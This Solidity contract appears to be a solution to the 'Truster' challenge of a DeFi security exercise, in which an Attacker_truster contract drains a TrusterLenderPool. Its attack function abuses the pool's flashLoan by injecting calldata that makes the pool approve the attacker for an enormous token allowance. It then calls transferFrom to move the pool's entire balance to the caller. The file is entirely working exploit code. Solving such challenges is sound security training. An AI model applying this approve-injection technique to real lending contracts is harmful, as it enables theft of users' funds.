// SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

import "./TrusterLenderPool.sol";
import "@openzeppelin/contracts/interfaces/IERC20.sol";

contract Attacker_truster {
    TrusterLenderPool public pool;
    IERC20 public token;

    constructor(TrusterLenderPool _pool, IERC20 _token) {
        pool = _pool;
        token = _token;
    }

    function attack() public {
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            10000000000000000 ether
        );

        pool.flashLoan(0, msg.sender, address(token), data);

        token.transferFrom(
            address(pool),
            msg.sender,
            token.balanceOf(address(pool))
        );
    }
}
